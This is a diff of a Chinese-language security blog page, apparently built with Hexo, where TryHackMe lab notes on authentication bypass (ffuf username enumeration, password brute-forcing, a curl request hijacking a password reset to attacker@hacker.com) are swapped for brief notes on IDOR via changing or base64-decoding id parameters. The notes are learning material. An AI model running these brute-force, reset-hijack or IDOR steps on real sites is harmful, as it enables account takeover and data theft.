@@ -18,24 +18,23 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="用户名枚举感觉这个用burp可能会更好理解一点,thm给的还是ffuf(真强啊这工具) 1ffuf -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;SecLists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -X POST -d &quot;username&#x3D;FUZZ&amp;email&#x3D;x&amp;password&#x3D;x&amp;cpassword&#x3D;x&quot; -H &quot;Co">
+    <meta name="description" content="我推的IDOROWASP TOP 10 中的越权漏洞 感觉这个实例很有用的样子 本质算是路径暴露?比如id&#x3D;1是admin用户,1以后的是普通用户,但在url里直接把id改成1就算idor了 实例创建一个账户,点击my account,打开F12然后刷新,可以看到 看到暴露路径了,&#x2F;api&#x2F;v1&#x2F;customer?id&#x3D;,把id依次改成别的再打开,">
 <meta property="og:type" content="article">
-<meta property="og:title" content="thm.身份验证绕过">
-<meta property="og:url" content="https://blog.yblue.top/2023/08/21/thm-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:title" content="thm.IDOR">
+<meta property="og:url" content="https://blog.yblue.top/2023/08/22/thm-IDOR/index.html">
 <meta property="og:site_name" content="Taosu&#96;Home">
-<meta property="og:description" content="用户名枚举感觉这个用burp可能会更好理解一点,thm给的还是ffuf(真强啊这工具) 1ffuf -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;SecLists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -X POST -d &quot;username&#x3D;FUZZ&amp;email&#x3D;x&amp;password&#x3D;x&amp;cpassword&#x3D;x&quot; -H &quot;Co">
+<meta property="og:description" content="我推的IDOROWASP TOP 10 中的越权漏洞 感觉这个实例很有用的样子 本质算是路径暴露?比如id&#x3D;1是admin用户,1以后的是普通用户,但在url里直接把id改成1就算idor了 实例创建一个账户,点击my account,打开F12然后刷新,可以看到 看到暴露路径了,&#x2F;api&#x2F;v1&#x2F;customer?id&#x3D;,把id依次改成别的再打开,">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230821195629.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230821200311.png">
-<meta property="article:published_time" content="2023-08-21T10:18:05.000Z">
-<meta property="article:modified_time" content="2023-08-21T14:05:28.755Z">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5d71d3fe747a8c8934564feddfc69f75.png">
+<meta property="article:published_time" content="2023-08-22T02:31:53.000Z">
+<meta property="article:modified_time" content="2023-08-22T02:39:41.592Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230821195629.png">
+<meta name="twitter:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5d71d3fe747a8c8934564feddfc69f75.png">
   
   
   
-  <title>thm.身份验证绕过 - Taosu`Home</title>
+  <title>thm.IDOR - Taosu`Home</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -189,7 +188,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="thm.身份验证绕过"></span>
+            <span id="subtitle" data-typed-text="thm.IDOR"></span>
           
         </div>
 
@@ -200,8 +199,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-21 18:18" pubdate>
-          August 21, 2023 pm
+        <time datetime="2023-08-22 10:31" pubdate>
+          August 22, 2023 am
         </time>
       </span>
     
@@ -212,7 +211,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.3k words
+          342 words
         
       </span>
     
@@ -223,7 +222,7 @@
         
         
         
-          12 mins
+          3 mins
         
       </span>
     
@@ -260,25 +259,18 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">thm.身份验证绕过</h1>
+            <h1 id="seo-header">thm.IDOR</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h1><p>感觉这个用burp可能会更好理解一点,thm给的还是ffuf(真强啊这工具)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d <span class="hljs-string">&quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u http://10.10.90.74/customers/signup -mr <span class="hljs-string">&quot;username already exists&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>-w 字典        -x 请求方法,不写-x则默认GET         -H是请求头,这里应用的是<code>Content-Type:</code>的内容,也可以指定别的报文内容(有点类似hackbar),x-www-form-urlencoded是指定url编码,这是常见的post请求的内容,<br>-mr是指定响应返回值,即只有响应用户名已存在的才会被返回,-d是需要用FUZZ替换的内容</p>
-<h1 id="密码暴力破解"><a href="#密码暴力破解" class="headerlink" title="密码暴力破解"></a>密码暴力破解</h1><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230821195629.png" srcset="/img/loading.gif" lazyload></p>
-<p>前面发现的用户名,这里存储到一个文件中用以爆破,<br>-e是允许转义字符存在,&gt;是替换&#x2F;存入全部内容,&gt;&gt;是追加</p>
-<p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230821200311.png" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ffuf -w username.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d <span class="hljs-string">&quot;username=W1&amp;password=W2&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u http://10.10.90.74/customers/login -<span class="hljs-built_in">fc</span> 200<br></code></pre></td></tr></table></figure>
-
-<p>就还是简单的爆破,跟burp本质没区别,感觉这个了解就行</p>
-<h1 id="逻辑缺陷"><a href="#逻辑缺陷" class="headerlink" title="逻辑缺陷"></a><strong>逻辑缺陷</strong></h1><p>这里很简略的提了一下,稍微说了下强比较</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&#x27;http://10.10.253.36/customers/reset?email=robert%40acmeitsupport.thm&#x27;</span> -H <span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -d <span class="hljs-string">&#x27;username=robert&amp;email=attacker@hacker.com&#x27;</span><br></code></pre></td></tr></table></figure>
-
-<p>前面是重置用户密码的网站,这里是先输入用户邮箱,然后进入到<code>http://10.10.253.36/customers/reset?email=robert%40acmeitsupport.thm</code>这个页面,这时再输入用户名(正常重置密码感觉应该不是这个顺序),这时再用curl访问请求,同时再次提交了一个post请求的内容:email改成我们自己创建的一个账户了,虽然本来系统已经获取了之前的用户邮箱,但这里是用post请求提交的,具有更高的优先级,就会把本来应该发给robert的重置密码的邮箱的消息发送到了hacker的邮箱</p>
+                <h1 id="我推的IDOR"><a href="#我推的IDOR" class="headerlink" title="我推的IDOR"></a>我推的IDOR</h1><p>OWASP TOP 10 中的越权漏洞</p>
+<p>感觉这个实例很有用的样子</p>
+<p>本质算是路径暴露?比如id&#x3D;1是admin用户,1以后的是普通用户,但在url里直接把id改成1就算idor了</p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>创建一个账户,点击my account,打开F12然后刷新,可以看到<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5d71d3fe747a8c8934564feddfc69f75.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>看到暴露路径了,&#x2F;api&#x2F;v1&#x2F;customer?id&#x3D;,把id依次改成别的再打开,就可以看到别人的信息了</p>
+<p>如果是id号是一串编码,则可以考虑经过base64编码,比如信息是&#x2F;?info&#x3D;e2lkPTE7dXNlcm5hbWU9YWRtaW59</p>
+<p>然后对这个解码,就是{id&#x3D;1;username&#x3D;admin},把id改成别的,大概就可以越权访问了?</p>
 
                 
               </div>
@@ -297,7 +289,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E8%B5%84%E6%BA%90/" class="category-chain-item">资源</a>
+  <a href="/categories/thm/" class="category-chain-item">thm</a>
   
   
 
@@ -317,15 +309,15 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>thm.身份验证绕过</div>
-      <div>https://blog.yblue.top/2023/08/21/thm-身份验证绕过/</div>
+      <div>thm.IDOR</div>
+      <div>https://blog.yblue.top/2023/08/22/thm-IDOR/</div>
     </div>
     <div class="license-meta">
       
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 21, 2023</div>
+          <div>August 22, 2023</div>
         </div>
       
       
@@ -357,9 +349,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/22/thm-IDOR/" title="thm.IDOR">
+                      <a href="/2023/08/22/thm-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="thm.文件包含">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">thm.IDOR</span>
+                        <span class="hidden-mobile">thm.文件包含</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -367,8 +359,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/08/21/thm-%E7%BD%91%E7%AB%99%E8%B5%84%E6%BA%90%E5%8F%91%E7%8E%B0/" title="thm.网站资源发现">
-                        <span class="hidden-mobile">thm.网站资源发现</span>
+                      <a href="/2023/08/21/thm-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/" title="thm.身份验证绕过">
+                        <span class="hidden-mobile">thm.身份验证绕过</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
